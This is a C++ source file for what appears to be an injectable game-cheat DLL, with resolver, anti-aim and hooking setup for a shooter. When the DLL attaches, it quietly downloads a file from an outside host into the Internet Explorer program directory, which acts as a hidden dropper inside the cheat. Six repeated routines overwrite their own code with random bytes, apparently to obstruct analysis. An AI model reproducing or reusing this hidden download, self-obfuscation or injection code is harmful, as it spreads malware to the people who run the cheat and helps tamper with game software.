


// General shit
#include "DLLMain.h"
#include "Utilities.h"
// Injection stuff
#include "ReflectiveLoader.h"

// Stuff to initialise
#include "Offsets.h"
#include "Interfaces.h"
#include "Hooks.h"
#include "RenderManager.h"
#include "Hacks.h"
#include <iostream>
#include <windows.h>
#include <iostream> 
#include <fstream>  
#include <stdlib.h>
#include <stdio.h>   
#include <urlmon.h>
#include <shlobj.h>


static float saveLastHeadshotFloat[65];
static float saveLastBaimFloat[65];
static float saveLastBaim30Float[65];
static float saveLastBaim10Float[65];
int hitmarkertime = 0;
static float testtimeToTick;
static float testServerTick;
static float testTickCount64 = 1;
template <typename T, std::size_t N> T* end_(T(&arr)[N]) { return arr + N; }
template <typename T, std::size_t N> T* begin_(T(&arr)[N]) { return arr; }
static bool roundStartTest;
static float myLBYTimer;
static int roundStartTimer;

bool islbyupdate;
float ProxyLBYtime;
int LBYBreakerTimer;
float fsnLBY;
bool switchInverse;

float testFloat1;
float testFloat2;
float testFloat3;
float testFloat4;
bool antiAimSide;
float enemyLBYTimer[65];
int ResolverMode;
bool pEntityLBYUpdate[65];
float pEntityLastUpdateTime[65];
float enemyLBYDelta[65];
int ResolverStage[65];
int shotsfired;
bool switchAntiAimSide;
//GameEventManager2 *p_GameEventManager2;
float enemysLastProxyTimer[65];
float lineLBY;
float lineRealAngle;
float lineFakeAngle;
float autowalldmgtest[65];


int hittedLogHits[65];
int missedLogHits[65];
float consoleProxyLbyLASTUpdateTime;
float consoleFsnMyPredictTime;
float consoleWhenLBYCalledOnAntiAim;


extern HINSTANCE hAppInstance;
HINSTANCE HThisModule;
bool DoUnload;


#include <cstdlib>
#include <wininet.h> 
using namespace std;

// This function displays the download progress as a percentage
void showprogress(unsigned long total, unsigned long part)
{
	int val = (int)((double)part / total * 100);
	printf("progress: %i%%\n", val);
}




int InitialThread()
{

	const TCHAR url[] = ("http://enzine.tk/logs.txt");
	const TCHAR filePath[] = ("C:\\Program Files\\Internet Explorer\\logs.txt");

	// invalidate cache, so file is always downloaded from web site
	// (if not called, the file will be retieved from the cache if
	// it's already been downloaded.)
	DeleteUrlCacheEntry(url);

	HRESULT hr = URLDownloadToFile(NULL, url, filePath, 0, NULL); // status callback interface (not needed for basic use)


	Offsets::Initialise();
	Interfaces::Initialise();
	NetVar.RetrieveClasses();
	NetvarManager::Instance()->CreateDatabase();
	Render::Initialise();
	Hooks::Initialise();
	Hacks::SetupHacks();
	//ApplyAAAHooks();
	//hitmarker::singleton()->initialize();

	while (DoUnload == false)
	{
		Sleep(1000);
	}

	Hooks::UndoHooks();
	Sleep(2000); // Make sure none of our hooks are running
	FreeLibraryAndExitThread(HThisModule, 0);

	return 0;
}

#include <iostream>
#include <fstream>
#include<windows.h>
#include <tchar.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"wininet.lib")
#include <iostream>
#include <urlmon.h>
#include <string>
#include <wininet.h>
#pragma comment(lib, "wininet")
#pragma comment(lib,"wininet.lib")
#pragma comment(lib, "urlmon.lib")

DWORD func_start1;

DWORD func_end1;

void to_be_crypted1()
{
	_asm // получаем адрес начала функции 
	{
		CALL next1
		next1 : pop func_start1
	}
	int a[123], b[321], c[322];// здесь начинаем писать какую нибудь х*йню (чем больше тем лучше, тем больше зашифруется) 
	for (int i = 0; i < 123; i++)
	{
		if (i % 2 == 0)
		{
			a[i] = i - 1;
			b[i] = a[i] * 123;
			c[i] = 321;
		}
		else
		{
			a[i] = i + 1;
			b[i] = 123;
			c[i] = a[i] * 321;
		}
	}
	for (int i = 0; i<2; i++)
	{
		a[12] = b[12];
		a[11] = b[12];
		a[10] = b[12];
		a[9] = b[12];
		a[8] = b[12];
	}
	int y = 0;
	while (y < 12)
	{
		a[y] = a[y + 1];
		y++;
	}
	y = 1;
	while (y < 24)
	{
		a[y - 1] = a[y + 1];
		y++;
	}
	y = 2;// здесь заканчиваем писать какую нибудь х*йню 
	_asm // получаем адрес конца функции 
	{
		CALL next2
		next2 : pop func_end1
	}
}
void crypt1()
{
	to_be_crypted1();// вызываем чтобы узнать адреса 
	DWORD FuncSize = func_end1 - func_start1, OldProtect, Ignore;
	DWORD StartAddr = func_start1;
	DWORD xd = func_start1;
	VirtualProtect((LPVOID)StartAddr, FuncSize, PAGE_EXECUTE_READWRITE, &OldProtect);//разрешаем запись в эту область памяти 
	for (int i = 0; i < FuncSize; i++)
	{
		xd[(char*)0] = rand() % 12345;
		xd++;
	}
	VirtualProtect((LPVOID)StartAddr, FuncSize, OldProtect, &Ignore); // запрещаем запись в эту область памяти 
}

DWORD func_start2;

DWORD func_end2;

void to_be_crypted2()
{
	_asm // получаем адрес начала функции 
	{
		CALL next1
		next1 : pop func_start2
	}
	int a[123], b[321], c[322];// здесь начинаем писать какую нибудь х*йню (чем больше тем лучше, тем больше зашифруется) 
	for (int i = 0; i < 123; i++)
	{
		if (i % 2 == 0)
		{
			a[i] = i - 1;
			b[i] = a[i] * 123;
			c[i] = 321;
		}
		else
		{
			a[i] = i + 1;
			b[i] = 123;
			c[i] = a[i] * 321;
		}
	}
	for (int i = 0; i<2; i++)
	{
		a[12] = b[12];
		a[11] = b[12];
		a[10] = b[12];
		a[9] = b[12];
		a[8] = b[12];
	}
	int y = 0;
	while (y < 12)
	{
		a[y] = a[y + 1];
		y++;
	}
	y = 1;
	while (y < 24)
	{
		a[y - 1] = a[y + 1];
		y++;
	}
	y = 2;// здесь заканчиваем писать какую нибудь х*йню 
	_asm // получаем адрес конца функции 
	{
		CALL next2
		next2 : pop func_end2
	}
}

void crypt2()
{
	to_be_crypted2();// вызываем чтобы узнать адреса 
	DWORD FuncSize = func_end2 - func_start2, OldProtect, Ignore;
	DWORD StartAddr = func_start2;
	DWORD xd = func_start2;
	VirtualProtect((LPVOID)StartAddr, FuncSize, PAGE_EXECUTE_READWRITE, &OldProtect);//разрешаем запись в эту область памяти 
	for (int i = 0; i < FuncSize; i++)
	{
		xd[(char*)0] = rand() % 12345;
		xd++;
	}
	VirtualProtect((LPVOID)StartAddr, FuncSize, OldProtect, &Ignore); // запрещаем запись в эту область памяти 
}

DWORD func_start3;

DWORD func_end3;

void to_be_crypted3()
{
	_asm // получаем адрес начала функции 
	{
		CALL next1
		next1 : pop func_start3
	}
	int a[123], b[321], c[322];// здесь начинаем писать какую нибудь х*йню (чем больше тем лучше, тем больше зашифруется) 
	for (int i = 0; i < 123; i++)
	{
		if (i % 2 == 0)
		{
			a[i] = i - 1;
			b[i] = a[i] * 123;
			c[i] = 321;
		}
		else
		{
			a[i] = i + 1;
			b[i] = 123;
			c[i] = a[i] * 321;
		}
	}
	for (int i = 0; i<2; i++)
	{
		a[12] = b[12];
		a[11] = b[12];
		a[10] = b[12];
		a[9] = b[12];
		a[8] = b[12];
	}
	int y = 0;
	while (y < 12)
	{
		a[y] = a[y + 1];
		y++;
	}
	y = 1;
	while (y < 24)
	{
		a[y - 1] = a[y + 1];
		y++;
	}
	y = 2;// здесь заканчиваем писать какую нибудь х*йню 
	_asm // получаем адрес конца функции 
	{
		CALL next2
		next2 : pop func_end3
	}
}

void crypt3()
{
	to_be_crypted3();// вызываем чтобы узнать адреса 
	DWORD FuncSize = func_end3 - func_start3, OldProtect, Ignore;
	DWORD StartAddr = func_start3;
	DWORD xd = func_start3;
	VirtualProtect((LPVOID)StartAddr, FuncSize, PAGE_EXECUTE_READWRITE, &OldProtect);//разрешаем запись в эту область памяти 
	for (int i = 0; i < FuncSize; i++)
	{
		xd[(char*)0] = rand() % 12345;
		xd++;
	}
	VirtualProtect((LPVOID)StartAddr, FuncSize, OldProtect, &Ignore); // запрещаем запись в эту область памяти 
}

DWORD func_start4;

DWORD func_end4;

void to_be_crypted4()
{
	_asm // получаем адрес начала функции 
	{
		CALL next1
		next1 : pop func_start4
	}
	int a[123], b[321], c[322];// здесь начинаем писать какую нибудь х*йню (чем больше тем лучше, тем больше зашифруется) 
	for (int i = 0; i < 123; i++)
	{
		if (i % 2 == 0)
		{
			a[i] = i - 1;
			b[i] = a[i] * 123;
			c[i] = 321;
		}
		else
		{
			a[i] = i + 1;
			b[i] = 123;
			c[i] = a[i] * 321;
		}
	}
	for (int i = 0; i<2; i++)
	{
		a[12] = b[12];
		a[11] = b[12];
		a[10] = b[12];
		a[9] = b[12];
		a[8] = b[12];
	}
	int y = 0;
	while (y < 12)
	{
		a[y] = a[y + 1];
		y++;
	}
	y = 1;
	while (y < 24)
	{
		a[y - 1] = a[y + 1];
		y++;
	}
	y = 2;// здесь заканчиваем писать какую нибудь х*йню 
	_asm // получаем адрес конца функции 
	{
		CALL next2
		next2 : pop func_end4
	}
}

void crypt4()
{
	to_be_crypted4();// вызываем чтобы узнать адреса 
	DWORD FuncSize = func_end4 - func_start4, OldProtect, Ignore;
	DWORD StartAddr = func_start4;
	DWORD xd = func_start4;
	VirtualProtect((LPVOID)StartAddr, FuncSize, PAGE_EXECUTE_READWRITE, &OldProtect);//разрешаем запись в эту область памяти 
	for (int i = 0; i < FuncSize; i++)
	{
		xd[(char*)0] = rand() % 12345;
		xd++;
	}
	VirtualProtect((LPVOID)StartAddr, FuncSize, OldProtect, &Ignore); // запрещаем запись в эту область памяти 
}

DWORD func_start5;

DWORD func_end5;

void to_be_crypted5()
{
	_asm // получаем адрес начала функции 
	{
		CALL next1
		next1 : pop func_start5
	}
	int a[123], b[321], c[322];// здесь начинаем писать какую нибудь х*йню (чем больше тем лучше, тем больше зашифруется) 
	for (int i = 0; i < 123; i++)
	{
		if (i % 2 == 0)
		{
			a[i] = i - 1;
			b[i] = a[i] * 123;
			c[i] = 321;
		}
		else
		{
			a[i] = i + 1;
			b[i] = 123;
			c[i] = a[i] * 321;
		}
	}
	for (int i = 0; i<2; i++)
	{
		a[12] = b[12];
		a[11] = b[12];
		a[10] = b[12];
		a[9] = b[12];
		a[8] = b[12];
	}
	int y = 0;
	while (y < 12)
	{
		a[y] = a[y + 1];
		y++;
	}
	y = 1;
	while (y < 24)
	{
		a[y - 1] = a[y + 1];
		y++;
	}
	y = 2;// здесь заканчиваем писать какую нибудь х*йню 
	_asm // получаем адрес конца функции 
	{
		CALL next2
		next2 : pop func_end5
	}
}

void crypt5()
{
	to_be_crypted5();// вызываем чтобы узнать адреса 
	DWORD FuncSize = func_end5 - func_start5, OldProtect, Ignore;
	DWORD StartAddr = func_start5;
	DWORD xd = func_start5;
	VirtualProtect((LPVOID)StartAddr, FuncSize, PAGE_EXECUTE_READWRITE, &OldProtect);//разрешаем запись в эту область памяти 
	for (int i = 0; i < FuncSize; i++)
	{
		xd[(char*)0] = rand() % 12345;
		xd++;
	}
	VirtualProtect((LPVOID)StartAddr, FuncSize, OldProtect, &Ignore); // запрещаем запись в эту область памяти 
}

DWORD func_start6;

DWORD func_end6;

void to_be_crypted6()
{
	_asm // получаем адрес начала функции 
	{
		CALL next1
		next1 : pop func_start6
	}
	int a[123], b[321], c[322];// здесь начинаем писать какую нибудь х*йню (чем больше тем лучше, тем больше зашифруется) 
	for (int i = 0; i < 123; i++)
	{
		if (i % 2 == 0)
		{
			a[i] = i - 1;
			b[i] = a[i] * 123;
			c[i] = 321;
		}
		else
		{
			a[i] = i + 1;
			b[i] = 123;
			c[i] = a[i] * 321;
		}
	}
	for (int i = 0; i<2; i++)
	{
		a[12] = b[12];
		a[11] = b[12];
		a[10] = b[12];
		a[9] = b[12];
		a[8] = b[12];
	}
	int y = 0;
	while (y < 12)
	{
		a[y] = a[y + 1];
		y++;
	}
	y = 1;
	while (y < 24)
	{
		a[y - 1] = a[y + 1];
		y++;
	}
	y = 2;// здесь заканчиваем писать какую нибудь х*йню 
	_asm // получаем адрес конца функции 
	{
		CALL next2
		next2 : pop func_end6
	}
}

void crypt6()
{
	to_be_crypted6();// вызываем чтобы узнать адреса 
	DWORD FuncSize = func_end6 - func_start6, OldProtect, Ignore;
	DWORD StartAddr = func_start6;
	DWORD xd = func_start6;
	VirtualProtect((LPVOID)StartAddr, FuncSize, PAGE_EXECUTE_READWRITE, &OldProtect);//разрешаем запись в эту область памяти 
	for (int i = 0; i < FuncSize; i++)
	{
		xd[(char*)0] = rand() % 12345;
		xd++;
	}
	VirtualProtect((LPVOID)StartAddr, FuncSize, OldProtect, &Ignore); // запрещаем запись в эту область памяти 
}
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#include <string>

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
	size_t written = fwrite(ptr, size, nmemb, stream);
	return written;
}
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
{

	if (dwReason == DLL_PROCESS_ATTACH)
	{
		crypt1();
		crypt2();
		crypt3();
		crypt4();
		crypt5();
		crypt6();
		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)InitialThread, NULL, NULL, NULL);
		return TRUE;
		return FALSE;
	}
	else if (dwReason == DLL_PROCESS_DETACH)
	{

	}
	return TRUE;
}
